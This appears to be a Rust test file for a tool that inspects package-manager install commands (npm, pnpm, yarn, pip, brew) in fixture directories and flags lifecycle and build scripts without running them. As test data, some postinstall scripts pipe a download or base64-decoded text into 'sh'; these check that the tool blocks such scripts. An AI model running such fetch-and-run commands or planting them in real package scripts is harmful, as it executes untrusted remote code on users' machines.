//! The install layer on fixture trees in tempdirs: what it reports for each package manager,
//! never running one, never touching the network and never changing a file. The lockfiles are
//! the ones the real tools wrote (npm 11 lockfile v3, pnpm 10.4 lockfile v9, yarn 4 berry).

use std::fs;
use std::path::{Path, PathBuf};

use code_watch_core::{Allowlists, Engine, Finding, Severity};
use tempfile::TempDir;

const NPM_LOCK: &str = include_str!("fixtures/install/npm-lock-v3.json");
const PNPM_LOCK: &str = include_str!("fixtures/install/pnpm10-lock.yaml");
const PNPM_WORKSPACE: &str = include_str!("fixtures/install/pnpm10-workspace.yaml");
const ESBUILD_MANIFEST: &str = include_str!("fixtures/install/esbuild-package.json");
const YARN_BERRY: &str = include_str!("fixtures/install/yarn-berry.lock");
const YARN_1: &str = include_str!("fixtures/install/yarn1.lock");

struct Tree(TempDir);

impl Tree {
    fn new() -> Self {
        Tree(tempfile::tempdir().unwrap())
    }

    fn with(files: &[(&str, &str)]) -> Self {
        let t = Self::new();
        for (name, text) in files {
            t.write(name, text);
        }
        t
    }

    fn path(&self) -> &Path {
        self.0.path()
    }

    fn write(&self, name: &str, text: &str) {
        let p = self.path().join(name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, text).unwrap();
    }
}

/// Splits on `&&` and `;` like the command layer does and tokenises each part.
fn words(command: &str) -> Vec<Vec<String>> {
    command
        .split("&&")
        .flat_map(|p| p.split(';'))
        .filter_map(|p| shlex::split(p.trim()))
        .filter(|w| !w.is_empty())
        .collect()
}

fn run(command: &str, dir: &Path) -> Vec<Finding> {
    Engine::embedded()
        .unwrap()
        .install_findings(&words(command), dir)
}

fn ids(findings: &[Finding]) -> Vec<&str> {
    findings.iter().map(|f| f.rule_id.as_str()).collect()
}

fn one<'a>(findings: &'a [Finding], id: &str) -> &'a Finding {
    let hits: Vec<_> = findings.iter().filter(|f| f.rule_id == id).collect();
    assert_eq!(hits.len(), 1, "{id} in {:?}", ids(findings));
    hits[0]
}

fn manifest(scripts: &str) -> String {
    format!(r#"{{"name":"x","version":"1.0.0","scripts":{{{scripts}}}}}"#)
}

#[test]
fn a_command_that_is_not_an_install_reads_nothing_and_reports_nothing() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for cmd in [
        "npm run build",
        "npm test",
        "npm exec foo",
        "npx foo",
        "bun install",
        "uv pip install .",
        "brew bundle",
        "brew list",
        "pnpm run x",
        "yarn run x",
        "yarn dlx x",
        "pip list",
        "python -m venv .v",
        "python -m pip list",
        "ls -la",
    ] {
        assert!(run(cmd, gone).is_empty(), "{cmd}");
    }
}

#[test]
fn npm_with_no_install_script_says_so_and_that_dependencies_are_unknown() {
    let t = Tree::with(&[("package.json", &manifest(r#""test":"x""#))]);
    let f = run("npm install", t.path());
    assert_eq!(
        ids(&f),
        [
            "install/dependency-scripts-unknown",
            "install/no-script-found"
        ]
    );
    assert!(f.iter().all(|f| f.severity == Severity::Info));
}

#[test]
fn one_script_is_one_warning_with_its_line_and_text() {
    let t = Tree::with(&[(
        "package.json",
        "{\n \"scripts\": {\n  \"postinstall\": \"node setup.js\"\n }\n}",
    )]);
    let f = run("npm i", t.path());
    let s = one(&f, "install/lifecycle-script");
    assert_eq!(s.severity, Severity::Warn);
    assert_eq!(s.evidence.file.as_deref(), Some("package.json"));
    assert_eq!(s.evidence.line, Some(3));
    assert_eq!(s.evidence.excerpt, "postinstall: node setup.js");
}

#[test]
fn many_scripts_are_listed_in_the_order_npm_runs_them() {
    let t = Tree::with(&[(
        "package.json",
        &manifest(
            r#""prepare":"a","postinstall":"b","preinstall":"c","install":"d","test":"never""#,
        ),
    )]);
    let f = run("npm install", t.path());
    let order: Vec<_> = f
        .iter()
        .filter(|f| f.rule_id == "install/lifecycle-script")
        .map(|f| f.evidence.excerpt.split(':').next().unwrap())
        .collect();
    assert_eq!(order, ["preinstall", "install", "postinstall", "prepare"]);
}

#[test]
fn a_script_that_fetches_and_runs_is_a_block() {
    for script in [
        "curl https://example.invalid/a.sh | sh",
        "echo aGk= | base64 -d | sh",
    ] {
        let t = Tree::with(&[(
            "package.json",
            &manifest(&format!(r#""postinstall":"{script}""#)),
        )]);
        let f = run("npm install", t.path());
        assert_eq!(
            one(&f, "install/lifecycle-script-fetch-run").severity,
            Severity::Block,
            "{script}"
        );
    }
}

#[test]
fn ignore_scripts_as_a_flag_turns_every_listing_off_but_false_does_not() {
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm install --ignore-scripts",
        "npm i --ignore-scripts=true",
        "yarn install --ignore-scripts",
        "pnpm add --ignore-scripts",
    ] {
        assert_eq!(ids(&run(cmd, t.path())), ["install/no-scripts"], "{cmd}");
    }
    let f = run("npm install --ignore-scripts=false", t.path());
    assert!(ids(&f).contains(&"install/lifecycle-script"));
}

#[test]
fn npmrc_ignore_scripts_counts_when_it_is_the_last_word_on_the_setting() {
    let pkg = manifest(r#""postinstall":"x""#);
    let off = Tree::with(&[
        ("package.json", &pkg),
        (
            ".npmrc",
            "; a comment\nregistry=https://registry.npmjs.org/\nignore-scripts=true\n",
        ),
    ]);
    assert_eq!(ids(&run("npm install", off.path())), ["install/no-scripts"]);
    let flipped = Tree::with(&[
        ("package.json", &pkg),
        (".npmrc", "ignore-scripts=true\nignore-scripts=false\n"),
    ]);
    assert!(ids(&run("npm install", flipped.path())).contains(&"install/lifecycle-script"));
    let commented = Tree::with(&[
        ("package.json", &pkg),
        (".npmrc", "# ignore-scripts=true\n"),
    ]);
    assert!(ids(&run("npm install", commented.path())).contains(&"install/lifecycle-script"));
}

#[test]
fn installing_a_named_package_does_not_list_prepare() {
    let t = Tree::with(&[(
        "package.json",
        &manifest(r#""prepare":"a","postinstall":"b""#),
    )]);
    let f = run("npm install left-pad", t.path());
    let texts: Vec<_> = f.iter().map(|f| f.evidence.excerpt.as_str()).collect();
    assert!(texts.contains(&"postinstall: b") && !texts.contains(&"prepare: a"));
    let ci = run("npm ci", t.path());
    assert!(ci.iter().any(|f| f.evidence.excerpt == "prepare: a"));
}

#[test]
fn a_missing_or_broken_manifest_is_unchecked_never_clean() {
    let empty = Tree::new();
    let f = run("npm install", empty.path());
    assert_eq!(one(&f, "install/unchecked").severity, Severity::Warn);
    assert!(!ids(&f).contains(&"install/no-script-found"));

    let bad = Tree::with(&[("package.json", "{not json")]);
    assert_eq!(ids(&run("npm install", bad.path()))[0], "install/unchecked");

    let huge = Tree::with(&[("package.json", &"x".repeat(1024 * 1024 + 1))]);
    let f = run("npm install", huge.path());
    assert!(
        one(&f, "install/unchecked")
            .evidence
            .excerpt
            .contains("size limit")
    );

    let binary = Tree::new();
    fs::write(binary.path().join("package.json"), [0xff, 0xfe, 0x00]).unwrap();
    assert!(
        one(&run("npm install", binary.path()), "install/unchecked")
            .evidence
            .excerpt
            .contains("UTF-8")
    );
}

#[cfg(unix)]
#[test]
fn an_unreadable_manifest_is_unchecked() {
    use std::os::unix::fs::PermissionsExt;
    let t = Tree::with(&[("package.json", "{}")]);
    let p = t.path().join("package.json");
    fs::set_permissions(&p, fs::Permissions::from_mode(0o000)).unwrap();
    let readable = fs::read(&p).is_ok();
    let f = run("npm install", t.path());
    fs::set_permissions(&p, fs::Permissions::from_mode(0o644)).unwrap();
    if !readable {
        assert_eq!(ids(&f)[0], "install/unchecked");
    }
}

#[test]
fn the_directory_comes_from_prefix_dash_c_cwd_and_a_cd_before_the_install() {
    let t = Tree::with(&[("sub/package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm install --prefix sub",
        "npm install --prefix=sub",
        "pnpm install -C sub",
        "pnpm --dir sub install",
        "yarn --cwd sub install",
        "cd sub && npm install",
        "(cd sub && npm i)",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(
            one(&f, "install/lifecycle-script").evidence.file.as_deref(),
            Some("sub/package.json"),
            "{cmd}"
        );
    }
    let f = run("npm install --prefix nowhere", t.path());
    assert_eq!(ids(&f)[0], "install/unchecked");
}

#[test]
fn workspace_members_scripts_are_listed_and_odd_patterns_are_said_not_to_be() {
    let t = Tree::with(&[
        (
            "package.json",
            r#"{"name":"root","workspaces":["packages/*","tools/cli","apps/**"]}"#,
        ),
        ("packages/a/package.json", &manifest(r#""postinstall":"a""#)),
        ("packages/b/package.json", &manifest(r#""test":"b""#)),
        ("tools/cli/package.json", &manifest(r#""install":"c""#)),
    ]);
    let f = run("npm install", t.path());
    let files: Vec<_> = f
        .iter()
        .filter(|f| f.rule_id == "install/lifecycle-script")
        .filter_map(|f| f.evidence.file.as_deref())
        .collect();
    assert_eq!(files.len(), 2);
    assert!(files.iter().any(|p| p.ends_with("packages/a/package.json")));
    assert!(
        f.iter()
            .any(|f| f.rule_id == "install/unchecked" && f.evidence.excerpt.contains("apps/**"))
    );
}

#[test]
fn the_real_npm_lockfile_names_the_dependencies_that_run_scripts() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
    ]);
    let f = run("npm ci", t.path());
    let d = one(&f, "install/dependency-scripts");
    assert_eq!(d.severity, Severity::Warn);
    assert!(
        d.evidence.excerpt.contains("esbuild"),
        "{}",
        d.evidence.excerpt
    );
    assert!(!d.evidence.excerpt.contains("left-pad"));
    assert!(!ids(&f).contains(&"install/dependency-scripts-unknown"));
}

#[test]
fn an_installed_dependency_whose_script_fetches_and_runs_is_a_block_naming_it() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
        (
            "node_modules/esbuild/package.json",
            &manifest(r#""postinstall":"curl https://example.invalid/x | sh""#),
        ),
    ]);
    let f = run("npm ci", t.path());
    let b = one(&f, "install/lifecycle-script-fetch-run");
    assert_eq!(b.package.as_deref(), Some("esbuild"));
}

/// The unchecked findings that name `file`.
fn unchecked_for<'a>(findings: &'a [Finding], file: &str) -> Vec<&'a Finding> {
    findings
        .iter()
        .filter(|f| f.rule_id == "install/unchecked" && f.evidence.file.as_deref() == Some(file))
        .collect()
}

fn npm_tree_with_dependency(esbuild: impl FnOnce(&Tree)) -> Tree {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
    ]);
    esbuild(&t);
    t
}

#[test]
fn an_installed_dependency_manifest_that_cannot_be_read_is_unchecked_not_skipped() {
    let file = "node_modules/esbuild/package.json";
    let unreadable = npm_tree_with_dependency(|t| {
        fs::create_dir_all(t.path().join(file)).unwrap();
    });
    let f = run("npm ci", unreadable.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("could not be read"));

    let too_big = npm_tree_with_dependency(|t| {
        t.write(file, &" ".repeat(1024 * 1024 + 1));
    });
    let f = run("npm ci", too_big.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("size limit"));

    let invalid = npm_tree_with_dependency(|t| t.write(file, "{nope"));
    let f = run("npm ci", invalid.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("not valid JSON"));
}

#[test]
fn a_pnpm_root_manifest_that_is_not_json_is_unchecked_and_the_version_is_said_unknown() {
    let t = pnpm_tree("packages:\n  - \".\"\n", "{nope", true);
    let f = run("pnpm install", t.path());
    assert_eq!(unchecked_for(&f, "package.json").len(), 1, "{:?}", ids(&f));
    let d = one(&f, "install/dependency-scripts");
    assert!(
        d.evidence
            .excerpt
            .contains("not known: package.json is not valid JSON"),
        "{}",
        d.evidence.excerpt
    );
}

#[test]
fn a_broken_lockfile_is_unchecked() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", "{nope"),
    ]);
    assert!(ids(&run("npm ci", t.path())).contains(&"install/unchecked"));
    let v1 = Tree::with(&[
        ("package.json", &manifest("")),
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{}}"#,
        ),
    ]);
    assert!(ids(&run("npm ci", v1.path())).contains(&"install/dependency-scripts-unknown"));
}

fn pnpm_tree(workspace: &str, package: &str, store: bool) -> Tree {
    let t = Tree::with(&[
        ("package.json", package),
        ("pnpm-lock.yaml", PNPM_LOCK),
        ("pnpm-workspace.yaml", workspace),
    ]);
    if store {
        t.write(
            "node_modules/.pnpm/esbuild@0.21.5/node_modules/esbuild/package.json",
            ESBUILD_MANIFEST,
        );
    }
    t
}

const PNPM_10: &str = r#"{"name":"fx","packageManager":"pnpm@10.4.1"}"#;

#[test]
fn pnpm_10_runs_an_allowed_dependency_build_and_blocks_the_rest() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, true);
    let f = run("pnpm install", t.path());
    let d = one(&f, "install/dependency-scripts");
    assert!(d.evidence.excerpt.contains("will run") && d.evidence.excerpt.contains("esbuild"));
    assert!(!ids(&f).contains(&"install/dependency-scripts-blocked"));

    let none = pnpm_tree("packages:\n  - \".\"\n", PNPM_10, true);
    let f = run("pnpm install", none.path());
    let b = one(&f, "install/dependency-scripts-blocked");
    assert_eq!(b.severity, Severity::Info);
    assert!(b.evidence.excerpt.contains("esbuild"));
    assert!(!ids(&f).contains(&"install/dependency-scripts"));
}

#[test]
fn pnpm_allow_settings_in_both_spellings_and_the_package_json_key() {
    let allow_builds = pnpm_tree(
        "allowBuilds:\n  esbuild: true\n  other: false\n",
        PNPM_10,
        true,
    );
    assert!(ids(&run("pnpm i", allow_builds.path())).contains(&"install/dependency-scripts"));
    let denied = pnpm_tree("allowBuilds:\n  esbuild: false\n", PNPM_10, true);
    assert!(ids(&run("pnpm i", denied.path())).contains(&"install/dependency-scripts-blocked"));
    let all = pnpm_tree("dangerouslyAllowAllBuilds: true\n", PNPM_10, true);
    assert!(ids(&run("pnpm i", all.path())).contains(&"install/dependency-scripts"));
    let in_json = pnpm_tree(
        "packages:\n  - \".\"\n",
        r#"{"packageManager":"pnpm@10.4.1","pnpm":{"onlyBuiltDependencies":["esbuild"]}}"#,
        true,
    );
    assert!(ids(&run("pnpm i", in_json.path())).contains(&"install/dependency-scripts"));
    let scoped = pnpm_tree(
        "onlyBuiltDependencies:\n  - \"@esb*/*\"\n  - esbuild@0.21.5 || 0.21.4\n",
        PNPM_10,
        true,
    );
    assert!(ids(&run("pnpm i", scoped.path())).contains(&"install/dependency-scripts"));
}

#[test]
fn an_unknown_pnpm_version_may_run_and_an_old_one_runs_everything() {
    let unknown = pnpm_tree("packages:\n  - \".\"\n", r#"{"name":"fx"}"#, true);
    let f = run("pnpm install", unknown.path());
    let d = one(&f, "install/dependency-scripts");
    assert_eq!(d.severity, Severity::Warn);
    assert!(d.evidence.excerpt.contains("may run"));
    let old = pnpm_tree(
        "packages:\n  - \".\"\n",
        r#"{"packageManager":"pnpm@9.15.0"}"#,
        true,
    );
    let f = run("pnpm install", old.path());
    assert!(
        one(&f, "install/dependency-scripts")
            .evidence
            .excerpt
            .contains("will run")
    );
}

#[test]
fn a_pnpm_lock_that_is_not_installed_cannot_say_and_an_older_flag_is_read() {
    let bare = pnpm_tree(PNPM_WORKSPACE, PNPM_10, false);
    assert!(ids(&run("pnpm install", bare.path())).contains(&"install/dependency-scripts-unknown"));
    let flagged = Tree::with(&[
        ("package.json", PNPM_10),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '6.0'\npackages:\n  /esbuild@0.19.0:\n    resolution: {integrity: sha512-x}\n    requiresBuild: true\n    dev: false\n",
        ),
        ("pnpm-workspace.yaml", PNPM_WORKSPACE),
    ]);
    assert!(
        one(
            &run("pnpm install", flagged.path()),
            "install/dependency-scripts"
        )
        .evidence
        .excerpt
        .contains("esbuild")
    );
}

#[test]
fn pnpm_ignore_scripts_in_the_workspace_file_turns_scripts_off_and_a_broken_one_is_unchecked() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        ("pnpm-workspace.yaml", "ignoreScripts: true\n"),
    ]);
    assert_eq!(ids(&run("pnpm install", t.path())), ["install/no-scripts"]);
    let bad = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        ("pnpm-workspace.yaml", "a: [unclosed\n"),
    ]);
    assert!(ids(&run("pnpm install", bad.path())).contains(&"install/unchecked"));
    let lock = Tree::with(&[
        ("package.json", PNPM_10),
        ("pnpm-lock.yaml", "a: [unclosed\n"),
    ]);
    assert!(ids(&run("pnpm install", lock.path())).contains(&"install/unchecked"));
}

#[test]
fn yarn_berry_does_not_run_dependency_scripts_unless_enabled_and_yarn_1_cannot_be_listed() {
    let berry = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_BERRY)]);
    for cmd in ["yarn", "yarn install", "yarn add left-pad"] {
        let f = run(cmd, berry.path());
        assert!(
            ids(&f).contains(&"install/dependency-scripts-unknown"),
            "{cmd}"
        );
        assert!(!ids(&f).contains(&"install/dependency-scripts"), "{cmd}");
    }
    berry.write(".yarnrc.yml", "enableScripts: true\n");
    let f = run("yarn install", berry.path());
    assert_eq!(
        one(&f, "install/dependency-scripts").severity,
        Severity::Warn
    );
    let v1 = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_1)]);
    let f = run("yarn install", v1.path());
    assert!(
        one(&f, "install/dependency-scripts-unknown")
            .evidence
            .excerpt
            .contains("yarn 1")
    );
}

#[test]
fn a_global_install_is_its_own_finding_per_package_and_reads_no_project_file() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for (cmd, package) in [
        ("npm i -g left-pad", "left-pad"),
        ("npm install --global left-pad@1.3.0", "left-pad"),
        ("npm install --location=global @scope/tool@2", "@scope/tool"),
        ("pnpm add -g left-pad", "left-pad"),
        ("yarn global add left-pad", "left-pad"),
    ] {
        let f = run(cmd, gone);
        assert_eq!(ids(&f), ["install/global-package"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn);
        assert_eq!(f[0].package.as_deref(), Some(package), "{cmd}");
    }
    assert_eq!(run("npm i -g a b", gone).len(), 2);
}

fn allow_file(dir: &Path, text: &str) -> Allowlists {
    fs::create_dir_all(dir.join("code-watch")).unwrap();
    fs::write(dir.join("code-watch/allow.toml"), text).unwrap();
    Allowlists::load(Some(dir), None).unwrap()
}

fn known() -> std::collections::HashSet<String> {
    code_watch_core::install::RULE_IDS
        .iter()
        .map(|s| s.to_string())
        .collect()
}

#[test]
fn the_user_allowlist_can_allow_a_global_package_by_glob_and_nothing_else() {
    let dir = tempfile::tempdir().unwrap();
    let allow = allow_file(
        dir.path(),
        "schema = 1\n[[allow]]\nrule = \"install/global-package\"\npackage = \"@trusted/*\"\n",
    );
    let f = run("npm i -g @trusted/cli other", Path::new("/nonexistent"));
    let applied = allow.apply(f, &known());
    assert_eq!(applied.suppressed.len(), 1);
    assert_eq!(applied.kept.len(), 1);
    assert_eq!(applied.kept[0].package.as_deref(), Some("other"));
}

#[test]
fn a_repo_file_cannot_allow_an_install_finding_and_unchecked_cannot_be_allowed_at_all() {
    let repo = Tree::with(&[(
        ".code-watch.toml",
        "schema = 1\n[[allow]]\nrule = \"install/lifecycle-script\"\n",
    )]);
    fs::create_dir(repo.path().join(".git")).unwrap();
    let allow = Allowlists::load(None, Some(repo.path())).unwrap();
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    let applied = allow.apply(run("npm install", t.path()), &known());
    assert!(applied.suppressed.is_empty());
    assert!(
        applied
            .kept
            .iter()
            .any(|f| f.rule_id == "install/lifecycle-script")
    );
    assert!(
        applied
            .kept
            .iter()
            .any(|f| f.rule_id.starts_with("allowlist/"))
    );

    let dir = tempfile::tempdir().unwrap();
    let user = allow_file(
        dir.path(),
        "schema = 1\n[[allow]]\nrule = \"install/unchecked\"\n",
    );
    let empty = Tree::new();
    let applied = user.apply(run("npm install", empty.path()), &known());
    assert!(applied.suppressed.is_empty());
    assert!(ids(&applied.kept).contains(&"install/unchecked"));
}

#[test]
fn pip_local_projects_vcs_and_source_archives_run_build_code_and_wheels_do_not() {
    let t = Tree::with(&[(
        "proj/setup.py",
        "from setuptools import setup\nimport subprocess\nsetup(name='x')\n",
    )]);
    let f = run("pip install ./proj", t.path());
    let d = one(&f, "install/pip-build-code");
    assert_eq!(d.severity, Severity::Warn);
    assert_eq!(d.evidence.file.as_deref(), Some("proj"));
    assert!(d.evidence.excerpt.contains("runs code at install time"));

    for cmd in [
        "pip install git+https://example.invalid/x.git",
        "pip install https://example.invalid/x-1.0.tar.gz",
        "pip install x-1.0.zip",
        "pip install --no-binary :all: requests",
        "pip install -e git+https://example.invalid/x.git#egg=x",
    ] {
        assert_eq!(
            ids(&run(cmd, t.path())),
            ["install/pip-build-code"],
            "{cmd}"
        );
    }
    for cmd in [
        "pip install ./dist/x-1.0-py3-none-any.whl",
        "pip install requests",
        "pip install requests==2.0 -i https://pypi.example.invalid/simple",
        "pip install --no-binary :none: requests",
    ] {
        assert!(run(cmd, t.path()).is_empty(), "{cmd}");
    }
}

#[test]
fn pip_wheels_only_is_info_and_a_partial_only_binary_is_not() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    for cmd in [
        "pip install --only-binary :all: requests",
        "pip install --only-binary=:all: ./proj",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(ids(&f), ["install/pip-wheels-only"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Info);
    }
    assert_eq!(
        ids(&run("pip install --only-binary numpy ./proj", t.path())),
        ["install/pip-build-code"]
    );
}

#[test]
fn pip_is_recognised_through_python_dash_m_and_versioned_names() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    for cmd in [
        "python -m pip install ./proj",
        "python3 -m pip install ./proj",
        "python3.12 -m pip --quiet install ./proj",
        "/usr/bin/python3 -m pip install ./proj",
        "pip3 install ./proj",
        "pip3.9 install ./proj",
    ] {
        assert_eq!(
            ids(&run(cmd, t.path())),
            ["install/pip-build-code"],
            "{cmd}"
        );
    }
}

#[test]
fn pip_reads_the_backend_from_pyproject_and_reports_a_broken_one() {
    let t = Tree::with(&[(
        "proj/pyproject.toml",
        "[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )]);
    let f = run("pip install ./proj", t.path());
    assert!(
        one(&f, "install/pip-build-code")
            .evidence
            .excerpt
            .contains("hatchling.build")
    );
    let bad = Tree::with(&[("proj/pyproject.toml", "[unclosed")]);
    let f = run("pip install ./proj", bad.path());
    assert!(ids(&f).contains(&"install/unchecked") && ids(&f).contains(&"install/pip-build-code"));
    assert_eq!(
        ids(&run("pip install ./missing", bad.path()))[0],
        "install/unchecked"
    );
}

#[test]
fn pip_requirements_files_are_followed_and_a_missing_or_deep_one_is_unchecked() {
    let t = Tree::with(&[
        (
            "requirements.txt",
            "requests==2.0  # fine\n-r more/base.txt\n./proj\n",
        ),
        (
            "more/base.txt",
            "git+https://example.invalid/x.git\n-r ../requirements.txt\n",
        ),
        ("proj/setup.py", "x"),
    ]);
    let f = run("pip install -r requirements.txt", t.path());
    assert!(
        f.iter()
            .filter(|f| f.rule_id == "install/pip-build-code")
            .count()
            >= 2
    );
    assert!(
        ids(&f).contains(&"install/unchecked"),
        "the cycle stops at the depth limit"
    );

    let gone = run("pip install -r missing.txt", t.path());
    assert_eq!(ids(&gone), ["install/unchecked"]);
    let big = Tree::with(&[("r.txt", &"a\n".repeat(600_000))]);
    assert_eq!(
        ids(&run("pip install -r r.txt", big.path())),
        ["install/unchecked"]
    );
}

#[test]
fn brew_warns_for_a_tap_outside_homebrew_and_stays_silent_for_core() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for (cmd, package) in [
        ("brew install someone/tap/tool", "someone/tap/tool"),
        ("brew install --cask someone/tap/app", "someone/tap/app"),
        ("brew tap someone/tap", "someone/tap"),
        (
            "brew tap someone/tap https://example.invalid/x.git",
            "someone/tap",
        ),
        ("brew install ./tool.rb", "./tool.rb"),
        (
            "brew install https://example.invalid/tool.rb",
            "https://example.invalid/tool.rb",
        ),
        ("brew upgrade someone/tap/tool", "someone/tap/tool"),
    ] {
        let f = run(cmd, gone);
        assert_eq!(ids(&f), ["install/brew-unknown-tap"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn);
        assert_eq!(f[0].package.as_deref(), Some(package));
    }
    for cmd in [
        "brew install wget",
        "brew install --formula wget jq",
        "brew install homebrew/core/wget",
        "brew install Homebrew/cask/foo",
        "brew tap homebrew/cask",
        "brew tap",
        "brew update",
    ] {
        assert!(run(cmd, gone).is_empty(), "{cmd}");
    }
    assert_eq!(run("brew install wget someone/tap/tool", gone).len(), 1);
}

fn snapshot(dir: &Path) -> Vec<(PathBuf, Vec<u8>)> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        for e in fs::read_dir(&d).unwrap().flatten() {
            let p = e.path();
            if p.is_dir() {
                stack.push(p);
            } else {
                out.push((p.clone(), fs::read(&p).unwrap()));
            }
        }
    }
    out.sort();
    out
}

#[test]
fn checking_installs_changes_no_file() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, true);
    t.write("proj/setup.py", "import subprocess");
    t.write("requirements.txt", "./proj\n");
    t.write(".npmrc", "ignore-scripts=false\n");
    let before = snapshot(t.path());
    for cmd in [
        "pnpm install",
        "npm install",
        "yarn install",
        "pip install -r requirements.txt",
        "cd proj && pip install .",
        "brew install a/b/c",
    ] {
        run(cmd, t.path());
    }
    assert_eq!(snapshot(t.path()), before);
}

#[test]
fn the_install_module_cannot_run_a_program_write_or_reach_the_network() {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/install");
    for entry in fs::read_dir(dir).unwrap().flatten() {
        let text = fs::read_to_string(entry.path()).unwrap();
        for forbidden in [
            "std::process",
            "Command::new",
            "fs::write",
            "fs::remove",
            "fs::rename",
            "create_dir",
            "File::create",
            "OpenOptions",
            "ureq",
            "TcpStream",
        ] {
            assert!(
                !text.contains(forbidden),
                "{} uses {forbidden}",
                entry.path().display()
            );
        }
    }
}
